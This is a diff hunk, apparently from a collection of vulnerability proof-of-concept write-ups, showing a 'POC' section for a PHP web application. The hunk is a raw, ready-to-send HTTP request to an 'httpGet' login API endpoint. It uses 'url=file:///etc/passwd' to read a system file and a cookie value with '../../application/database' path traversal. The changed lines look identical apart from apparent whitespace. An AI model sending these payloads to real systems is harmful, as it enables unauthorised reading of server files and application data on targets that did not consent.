@@ -63,15 +63,15 @@ body="/static/index/js/jweixin-1.2.0.js"
   
 POC  
 ```
-GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
-Upgrade-Insecure-Requests: 1
+Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 Pragma: no-cache
 Cache-Control: no-cache
